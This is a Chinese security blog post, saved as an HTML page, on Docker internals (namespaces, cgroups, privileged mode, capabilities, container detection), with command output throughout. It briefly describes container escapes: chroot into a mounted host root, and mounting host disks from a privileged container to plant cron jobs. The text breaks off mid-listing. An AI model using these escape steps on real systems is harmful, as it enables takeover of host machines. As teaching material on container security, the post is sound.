



<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://example.com/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://example.com/atom.xml" />
<link rel="alternate" type="application/json" title="Hexo" href="http://example.com/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  

<link rel="canonical" href="http://example.com/2022/11/27/Docker%E9%80%83%E9%80%B8/">



  <title>
docker逃逸&capabilities - web安全 |
Yume Shoka = Hexo</title>
<meta name="generator" content="Hexo 5.4.2"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">docker逃逸&capabilities
  </h1>
  
<div class="meta">
  <span class="item" title="Created: 2022-11-27 13:38:45">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">Posted on</span>
    <time itemprop="dateCreated datePublished" datetime="2022-11-27T13:38:45+08:00">2022-11-27</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="Toggle navigation bar">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">Yume Shoka</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
        <ul>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclhfehz7j20zk0m8u0x.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclhnx9glj20zk0m8npd.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeyhsblkj20zk0m81kx.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicitcxhpij20zk0m8hdt.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipevo9j1jj20zk0m8e81.jpg"></li>
          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclwuom7cj20zk0m8dvn.jpg"></li>
        </ul>
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="item" rel="index" title="In web安全"><span itemprop="name">web安全</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
  <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/27/Docker%E9%80%83%E9%80%B8/">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="John Doe">
    <meta itemprop="description" content=", ">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Hexo">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="docker逃逸-反弹shellcapabilities"><a class="markdownIt-Anchor" href="#docker逃逸-反弹shellcapabilities">#</a> Docker 逃逸、反弹 shell，capabilities</h1>
<h2 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识">#</a> 前置知识</h2>
<h3 id="1linux-namespace"><a class="markdownIt-Anchor" href="#1linux-namespace">#</a> 1.Linux NameSpace</h3>
<p>Linux Namespace 是 Linux 提供的一种<strong>内核级别环境隔离</strong>的方法。从 Unix 开始，有一个 chroot 命令，</p>
<p>chroot</p>
<blockquote>
<p>change root directory (更改 root 目录)。在 linux 系统中，系统默认的目录结构都是以  <code>/</code> ，即是以根 (root) 开始的。而在使用 chroot 之后，系统的目录结构将以指定的位置作为  <code>/</code>  位置。</p>
</blockquote>
<p>也就是说，原先我们的 root 目录在 /，那么我们在 tmp 目录使用 chroot 后，那么我们的 / 目录就在 tmp / 下，在 docker 中有一种逃逸方式，在 docker 启动的时候，挂在宿主机的根目录，假设，启动时，把宿主机的根目录挂载在了 docker 中的 / UzJu / 目录</p>
<p><code>docker run -it -v /:/uzju/ ubuntu:18.04</code></p>
<p>那么此时，我们进入到 docker 中，使用 chroot，将根目录切换至 / UzJu / 目录下</p>
<p><code>chroot /uzju/</code></p>
<p>此时我们就可以使用 crontab 等多种方式获取宿主机权限</p>
<p>那么 chroot 提供的就是一种简单的隔离环境，chroot 内部的内容无法访问外部的，Linux NameSpace 在这个基础上，又提供了对以下内容的隔离机制</p>
<ul>
<li>UTS</li>
<li>IPC</li>
<li>mount</li>
<li>PID</li>
<li>network</li>
<li>User</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">| Mount namespaces | CLONE_NEWNS | Linux内核2.4.19 |</span><br><span class="line">| ---------------------- | -------------- | ------------------------- |</span><br><span class="line">| UTS Namespaces | CLONE_NEWUTS | Linux内核2.6.19 |</span><br><span class="line">| IPC NameSpaces | CLONE_NEWIPC | Linux内核2.6.19 |</span><br><span class="line">| PID namespaces | CLONE_NEWPID | Linux内核2.6.24 |</span><br><span class="line">| Network namespaces | CLONE_NEWNET | Linux内核2.6.24-&gt;2.6.29 |</span><br><span class="line">| User namespaces | CLONE_NEWUSER | Linux内核2.6.23 |</span><br></pre></td></tr></table></figure>
<p>在 Linux 文档中我们可以看到，目前，Linux 实现了六种不同类型的命名空间。每个命名空间的目的是将特定的全局系统资源包装在一个抽象中，使命名空间内的进程看起来拥有自己的全局资源隔离实例。命名空间的总体目标之一是支持容器的实现，<span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzUyNDk1Mi8=">容器</span>是一种用于轻量级虚拟化（以及其他目的）的工具，它为一组进程提供了它们是系统上唯一进程的错觉。</p>
<h3 id="2linux-cgroup"><a class="markdownIt-Anchor" href="#2linux-cgroup">#</a> 2.Linux Cgroup</h3>
<p>虽然 NameSpace 解决了环境隔离上的问题，但是并没有解决主机上资源的隔离，虽然可以通过 NameSpace 把单个容器关到一个特定的环境中，但是单个容器对其中的进程使用的 CPU，内存，磁盘等这些计算资源其实都是可以操作的，所以对进程进行资源上的限制或者控制，这就 Linux Cgroup 的作用</p>
<p>Linux CGroup 全称 Linux Control Group， 是 Linux 内核的一个功能，用来限制，控制与分离一个进程组群的资源（如 CPU、内存、磁盘输入输出等）。</p>
<p>Linux Cgroup 主要提供以下功能</p>
<blockquote>
<p>1、Resource limitation：限制资源的使用</p>
<ul>
<li>例如：内存使用上限以及文件系统的缓存限制</li>
</ul>
<p>2、Prioritization：优先级控制</p>
<ul>
<li>例如：CPU 利用和磁盘的 IO 吞吐</li>
</ul>
<p>3、Accounting 一些审计和一些统计</p>
<p>4、Control</p>
<ul>
<li>挂起进程，恢复执行进程</li>
</ul>
</blockquote>
<p><strong>Cgroup 主要限制的资源</strong></p>
<ul>
<li>CPU</li>
<li>内存</li>
<li>网络</li>
<li>磁盘 I/O</li>
</ul>
<p>Cgroup 子系统</p>
<p>cgroups 的全称是 control groups，cgroups 为每种可以控制的资源定义了一个子系统。典型的子系统介绍如下：</p>
<blockquote>
<ol>
<li>cpu 子系统，主要限制进程的 cpu 使用率。</li>
<li>cpuacct 子系统，可以统计 cgroups 中的进程的 cpu 使用报告。</li>
<li>cpuset 子系统，可以为 cgroups 中的进程分配单独的 cpu 节点或者内存节点。</li>
<li>memory 子系统，可以限制进程的 memory 使用量。</li>
<li>blkio 子系统，可以限制进程的块设备 io。</li>
<li>devices 子系统，可以控制进程能够访问某些设备。</li>
<li>net_cls 子系统，可以标记 cgroups 中进程的网络数据包，然后可以使用 tc 模块（traffic control）对数据包进行控制。</li>
<li>freezer 子系统，可以挂起或者恢复 cgroups 中的进程。</li>
<li>ns 子系统，可以使不同 cgroups 下面的进程使用不同的 namespace。</li>
</ol>
</blockquote>
<p>Cgroup 在什么时候创建</p>
<p>Linux 内核通过一个叫做 cgroupfs 的伪文件系统来提供管理 cgroup 的接口，我们可以通过 lscgroup 命令来列出系统中已有的 cgroup，该命令实际上遍历了 /sys/fs/cgroup/ 目录中的文件:</p>
<p><code>lscgroup | tee cgroup.a</code></p>
<p>Cgroup 限制资源访问</p>
<p>如果安装 docker 之后，在每个子系统下都会有一个 docker 的目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-11-centos docker]# pwd</span><br><span class="line">/sys/fs/cgroup/cpu/docker</span><br><span class="line">[root@VM-16-11-centos docker]# ls -al</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x 7 root root 0 Nov 27 10:44 .</span><br><span class="line">drwxr-xr-x 6 root root 0 Mar 22  2022 ..</span><br><span class="line">drwxr-xr-x 2 root root 0 Sep  5 00:40 3b631c7bd783be6f305e3e8e3065563407ccc7b8a300f13b176a3ddb56667649</span><br><span class="line">drwxr-xr-x 2 root root 0 Sep  4 12:33 4ef7dbc2052fcda8d703d7676bd929e12d9f444d95e42624caa68a83246e37d9</span><br><span class="line">drwxr-xr-x 2 root root 0 Sep  5 00:40 91fb044dac907328965ae3e4813a1ce0c57ead57a30f00cb1aaabbb29d2598bd</span><br><span class="line">drwxr-xr-x 2 root root 0 Sep  4 12:21 ac016bd93be4a5955fffc8fd108580930fae2266eec95bab966d0a65197f5e40</span><br><span class="line">-rw-r--r-- 1 root root 0 Apr 17  2022 cgroup.clone_children</span><br><span class="line">--w--w--w- 1 root root 0 Apr 17  2022 cgroup.event_control</span><br><span class="line">-rw-r--r-- 1 root root 0 Apr 17  2022 cgroup.procs</span><br><span class="line">-r--r--r-- 1 root root 0 Apr 17  2022 cpuacct.stat</span><br><span class="line">-rw-r--r-- 1 root root 0 Apr 17  2022 cpuacct.usage</span><br><span class="line">-r--r--r-- 1 root root 0 Apr 17  2022 cpuacct.usage_percpu</span><br><span class="line">-rw-r--r-- 1 root root 0 Apr 17  2022 cpu.cfs_period_us</span><br><span class="line">-rw-r--r-- 1 root root 0 Apr 17  2022 cpu.cfs_quota_us</span><br><span class="line">-rw-r--r-- 1 root root 0 Apr 17  2022 cpu.rt_period_us</span><br><span class="line">-rw-r--r-- 1 root root 0 Apr 17  2022 cpu.rt_runtime_us</span><br><span class="line">-rw-r--r-- 1 root root 0 Apr 17  2022 cpu.shares</span><br><span class="line">-r--r--r-- 1 root root 0 Apr 17  2022 cpu.stat</span><br><span class="line">drwxr-xr-x 2 root root 0 Sep  4 12:32 ea2618b4f0bd98b8d0326c98d9edae2e8ee9ad911b4356901b0eac429f0e7996</span><br><span class="line">-rw-r--r-- 1 root root 0 Apr 17  2022 notify_on_release</span><br><span class="line">-rw-r--r-- 1 root root 0 Apr 17  2022 tasks</span><br></pre></td></tr></table></figure>
<p>其中的 3b63 等都是 docker 容器，启动这个容器时，Docker 会为这个容器创建一个与容器标识符相同的 CGroup，在当前的主机上 CGroup 就会有以下的层级关系：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/UzJuMarkDownImage1bf68aab2e78dfa6ab6df817e1d83e3c.png" alt=""></p>
<p>每一个 CGroup 下面都有一个 tasks 文件，其中存储着属于当前控制组的所有进程的 pid，作为负责 cpu 的子系统，cpu.cfs_quota_us 文件中的内容能够对 CPU 的使用作出限制，如果当前文件的内容为 50000，那么当前控制组中的全部进程的 CPU 占用率不能超过 50%。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-11-centos 3b631c7bd783be6f305e3e8e3065563407ccc7b8a300f13b176a3ddb56667649]# pwd</span><br><span class="line">/sys/fs/cgroup/cpu/docker/3b631c7bd783be6f305e3e8e3065563407ccc7b8a300f13b176a3ddb56667649</span><br><span class="line">[root@VM-16-11-centos 3b631c7bd783be6f305e3e8e3065563407ccc7b8a300f13b176a3ddb56667649]# ls -al</span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x 2 root root 0 Sep  5 00:40 .</span><br><span class="line">drwxr-xr-x 7 root root 0 Nov 27 10:44 ..</span><br><span class="line">-rw-r--r-- 1 root root 0 Sep  5 00:40 cgroup.clone_children</span><br><span class="line">--w--w--w- 1 root root 0 Sep  5 00:40 cgroup.event_control</span><br><span class="line">-rw-r--r-- 1 root root 0 Sep  5 00:40 cgroup.procs</span><br><span class="line">-r--r--r-- 1 root root 0 Sep  5 00:40 cpuacct.stat</span><br><span class="line">-rw-r--r-- 1 root root 0 Sep  5 00:40 cpuacct.usage</span><br><span class="line">-r--r--r-- 1 root root 0 Sep  5 00:40 cpuacct.usage_percpu</span><br><span class="line">-rw-r--r-- 1 root root 0 Sep  5 00:40 cpu.cfs_period_us</span><br><span class="line">-rw-r--r-- 1 root root 0 Sep  5 00:40 cpu.cfs_quota_us</span><br><span class="line">-rw-r--r-- 1 root root 0 Sep  5 00:40 cpu.rt_period_us</span><br><span class="line">-rw-r--r-- 1 root root 0 Sep  5 00:40 cpu.rt_runtime_us</span><br><span class="line">-rw-r--r-- 1 root root 0 Sep  5 00:40 cpu.shares</span><br><span class="line">-r--r--r-- 1 root root 0 Sep  5 00:40 cpu.stat</span><br><span class="line">-rw-r--r-- 1 root root 0 Sep  5 00:40 notify_on_release</span><br><span class="line">-rw-r--r-- 1 root root 0 Sep  5 00:40 tasks</span><br><span class="line">[root@VM-16-11-centos 3b631c7bd783be6f305e3e8e3065563407ccc7b8a300f13b176a3ddb56667649]# cat cpu.cfs_quota_us </span><br><span class="line">-1</span><br></pre></td></tr></table></figure>
<p>cgroup 支持文件种类</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1648779855-579587-image.png" alt="img"></p>
<p>Linux 的 NameSpace 和 Cgroup 分别解决了不同资源隔离的问题，前者解决了进程、网络以及文件系统的隔离，后者实现了 CPU、内存等资源的隔离。</p>
<p><strong>docker 的实现原理</strong></p>
<p><strong>其实 docker 就是一个 linux 下的进程，通过 Linux NameSpaces 对不同的容器进行隔离，为了保证宿主机与容器资源上的隔离，与资源占用的比例，所有使用 Cgroup 对进程进行资源上的限制或者控制</strong></p>
<h3 id="3特权模式"><a class="markdownIt-Anchor" href="#3特权模式">#</a> 3. 特权模式</h3>
<p>启动特权模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --privileged nginx /bin/bash</span><br></pre></td></tr></table></figure>
<p>k8s 中，在 pod 的 yaml 配置中添加如下配置时，也会以特权模式启动容器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">securityContext:</span><br><span class="line">  privileged: true</span><br></pre></td></tr></table></figure>
<p>特权模式与非特权模式</p>
<p>1.linux capabilities</p>
<blockquote>
<p>普通模式下容器内进程只可以使用有限的一些 linux capabilities:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --rm -it  r.j3ss.co/amicontained bash</span><br><span class="line"></span><br><span class="line">Status: Downloaded newer image for r.j3ss.co/amicontained:latest</span><br><span class="line">Container Runtime: docker</span><br><span class="line">Has Namespaces:</span><br><span class="line">	pid: true</span><br><span class="line">	user: false</span><br><span class="line">AppArmor Profile: unconfined</span><br><span class="line">Capabilities:</span><br><span class="line">	BOUNDING -&gt; chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap</span><br><span class="line">Seccomp: filtering</span><br><span class="line">Blocked Syscalls (64):</span><br><span class="line">	MSGRCV PTRACE SYSLOG SETPGID SETSID USELIB USTAT SYSFS VHANGUP PIVOT_ROOT _SYSCTL ACCT SETTIMEOFDAY MOUNT UMOUNT2 SWAPON SWAPOFF REBOOT SETHOSTNAME SETDOMAINNAME IOPL IOPERM CREATE_MODULE INIT_MODULE DELETE_MODULE GET_KERNEL_SYMS QUERY_MODULE QUOTACTL NFSSERVCTL GETPMSG PUTPMSG AFS_SYSCALL TUXCALL SECURITY LOOKUP_DCOOKIE CLOCK_SETTIME VSERVER MBIND SET_MEMPOLICY GET_MEMPOLICY KEXEC_LOAD ADD_KEY REQUEST_KEY KEYCTL MIGRATE_PAGES UNSHARE MOVE_PAGES PERF_EVENT_OPEN FANOTIFY_INIT NAME_TO_HANDLE_AT OPEN_BY_HANDLE_AT SETNS PROCESS_VM_READV PROCESS_VM_WRITEV KCMP FINIT_MODULE KEXEC_FILE_LOAD BPF USERFAULTFD PREADV2 PWRITEV2 PKEY_MPROTECT PKEY_ALLOC PKEY_FREE</span><br></pre></td></tr></table></figure>
<p>但是，特权模式下的容器内进程可以使用所有的 linux capabilities:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --privileged --rm -it  r.j3ss.co/amicontained bash</span><br><span class="line"></span><br><span class="line">Container Runtime: docker</span><br><span class="line">Has Namespaces:</span><br><span class="line">	pid: true</span><br><span class="line">	user: false</span><br><span class="line">AppArmor Profile: unconfined</span><br><span class="line">Capabilities:</span><br><span class="line">	BOUNDING -&gt; chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend</span><br><span class="line">Seccomp: disabled</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>特权模式下，容器内进程拥有使用所有的 linux capabilities 的能力，但是， 不表示进程就一定有使用某些 linux capabilities 的权限。比如，如果容器是以非 root 用户启动的， 就算它是以特权模式启动的容器，也不表示它就能够做一些无权限做的事情:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --rm -it debian:buster chown 65534 /var/log/lastlog</span><br><span class="line"></span><br><span class="line">$ docker run -u 65534 --rm -it debian:buster chown 65534 /var/log/lastlog</span><br><span class="line">chown: changing ownership of &#x27;/var/log/lastlog&#x27;: Operation not permitted</span><br><span class="line"></span><br><span class="line">$ docker run --privileged -u 65534 --rm -it debian:buster chown 65534 /var/log/lastlog</span><br><span class="line">chown: changing ownership of &#x27;/var/log/lastlog&#x27;: Operation not permitted&#x27;</span><br></pre></td></tr></table></figure>
</blockquote>
<ol start="2">
<li></li>
</ol>
<blockquote>
<p>普通模式下，部分内核模块路径比如 /proc 下的一些目录需要阻止写入、有些又需要允许读写， 这些文件目录将会以 tmpfs 文件系统的方式挂载到容器中，以实现目录 mask 的需求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --rm -it debian:buster mount |grep &#x27;/proc.*tmpfs&#x27;</span><br><span class="line">tmpfs on /proc/acpi type tmpfs (ro,relatime)</span><br><span class="line">tmpfs on /proc/kcore type tmpfs (rw,nosuid,size=65536k,mode=755)</span><br></pre></td></tr></table></figure>
<p>特权模式下，这些目录将不再以 tmpfs 文件系统的方式挂载:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --privileged --rm -it debian:buster mount |grep &#x27;/proc.*tmpfs&#x27;</span><br></pre></td></tr></table></figure>
</blockquote>
<ol start="3">
<li></li>
</ol>
<blockquote>
<p>普通模式下，部分内核文件系统 (sysfs、procfs) 会被以只读的方式挂载到容器中，以阻止容器内进程随意修改系统内核:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --rm -it debian:buster mount |grep &#x27;(ro&#x27;</span><br><span class="line">sysfs on /sys type sysfs (ro,nosuid,nodev,noexec,relatime)</span><br><span class="line">cgroup on /sys/fs/cgroup/memory type cgroup (ro,nosuid,nodev,noexec,relatime,memory)</span><br><span class="line">cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)</span><br></pre></td></tr></table></figure>
<p>但是在特权模式下，内核文件系统将不再以只读的方式被挂载:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --privileged --rm -it debian:buster mount |grep &#x27;(ro&#x27;</span><br></pre></td></tr></table></figure>
</blockquote>
<ol start="4">
<li></li>
</ol>
<blockquote>
<p>普通模式下，可以通过配置 AppArmor 或 Seccomp 相关安全选项 （如果未配置的话，容器引擎默认也会启用一些对应的默认配置） 对容器进行加固:</p>
<p>特权模式下，这些 AppArmor 或 Seccomp 相关配置将不再生效:</p>
<p>普通模式下也可以通过对应的安全选项来禁用 AppArmor 或 Seccomp 特性。</p>
</blockquote>
<ol start="5">
<li></li>
</ol>
<blockquote>
<p>默认模式下，只能以只读模式操作 cgroup</p>
<p>特权模式下，将可以对 cgroup 进行读写操作:</p>
</blockquote>
<ol start="6">
<li></li>
</ol>
<blockquote>
<p>普通模式下，容器内 /dev 目录下看不到节点 /dev 目录下特有的 devices</p>
<p>特权模式下，容器内的 /dev 目录会包含这些来自节点 /dev 目录下的那些内容:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --privileged --rm -it debian:buster ls /dev</span><br><span class="line">autofs           mapper              stdin   tty25  tty44  tty63    vcsa1</span><br><span class="line">btrfs-control    mcelog              stdout  tty26  tty45  tty7     vcsa2</span><br><span class="line">bus              mem                 tty     tty27  tty46  tty8     vcsa3</span><br></pre></td></tr></table></figure>
</blockquote>
<ol start="7">
<li></li>
</ol>
<blockquote>
<p>特权模式下，SELinux 相关的安全加固配置将被禁用。</p>
<p>普通模式下也可以通过对应的安全选项来禁用 SELinux 特性。</p>
</blockquote>
<p>特权模式于版本 6.0 时被引入 Docker，允许容器内的 root 拥有外部物理机 root 权限，而此前容器内 root 用户仅拥有外部物理机普通用户权限。</p>
<p>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行 docker run --privileged 时，Docker 容器将被允许访问主机上的所有设备，并可以执行 mount 命令进行挂载。</p>
<p>当控制使用特权模式启动的容器时，docker 管理员可通过 mount 命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tb3ppbGxhemcuY29tLzIwMjEvMTEvZG9ja2VyLWNvbnRhaW5lci1kaWZmZXJlbmNlLWJldHdlZW4tcHJpdmlsZWdlZC1tb2RlLWFuZC1ub24tcHJpdmlsZWdlZC1tb2RlLmh0bWw=">容器特权模式与非特权模式的区别 - mozillazg’s Blog</span></p>
<h3 id="4docker-环境判断"><a class="markdownIt-Anchor" href="#4docker-环境判断">#</a> 4.docker 环境判断</h3>
<p>1. 根据.dockerenv 判断</p>
<p>非 docker 环境：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-11-centos ~]# ls -al /.dockerenv</span><br><span class="line">ls: cannot access /.dockerenv: No such file or directory</span><br></pre></td></tr></table></figure>
<p>docker 环境：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@9b14f6362056:/# ls -al /.dockerenv </span><br><span class="line">-rwxr-xr-x 1 root root 0 Nov 27 03:33 /.dockerenv</span><br></pre></td></tr></table></figure>
<p>2. 根据从 group 信息</p>
<p>非 docker 环境：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-11-centos ~]# cat /proc/1/cgroup </span><br><span class="line">11:hugetlb:/</span><br><span class="line">10:freezer:/</span><br><span class="line">9:devices:/</span><br><span class="line">8:cpuset:/</span><br><span class="line">7:blkio:/</span><br><span class="line">6:cpuacct,cpu:/</span><br><span class="line">5:pids:/</span><br><span class="line">4:perf_event:/</span><br><span class="line">3:memory:/</span><br><span class="line">2:net_prio,net_cls:/</span><br><span class="line">1:name=systemd:/</span><br></pre></td></tr></table></figure>
<p>docker 环境：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@9b14f6362056:/# cat /proc/1/cgroup </span><br><span class="line">11:hugetlb:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class="line">10:freezer:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class="line">9:devices:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span class="line">8:cpuset:/docker/9b14f63620563d3dcf5b23d3c80ab657812f6928b7a78fca22a61c0a072732f3</span><br><span 